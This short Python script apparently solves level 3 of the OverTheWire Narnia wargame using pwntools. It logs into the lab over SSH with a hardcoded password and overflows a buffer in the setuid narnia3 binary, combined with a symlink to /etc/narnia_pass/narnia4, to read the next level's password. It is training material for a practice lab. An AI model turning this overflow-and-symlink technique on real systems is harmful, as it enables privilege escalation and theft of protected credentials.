import pwn
import random
import string
#python3 this time
s=pwn.ssh(host='narnia.labs.overthewire.org', user='narnia3', password='vaequeezee', port=2226)
sh=s.process('sh')
#strcmp takes an argument that is 32 bits long
#so we can overflow the function and overwrite the 16bit buffer that has /dev/null to get the password through a symbolic link
bit32dir="/tmp/"+''.join([random.choice(string.ascii_letters) for i in range(27)])
sh.sendline("mkdir "+bit32dir)
sh.sendline("cd "+bit32dir)
sh.sendline("mkdir tmp")
sh.sendline("cd tmp")
print("Loading...")
sh.sendline("ln -s /etc/narnia_pass/narnia4 output")
sh.sendline("touch /tmp/output")
sh.sendline("chmod 777 /tmp/output")
sh.sendline("/narnia/narnia3 "+bit32dir+"/tmp/output")
print(sh.recvline())
sh.sendline("cat /tmp/output")
flag=sh.recvline().decode('utf-8')[2:]
pwn.log.info("Flag is: "+flag)
sh.close()
s.close()
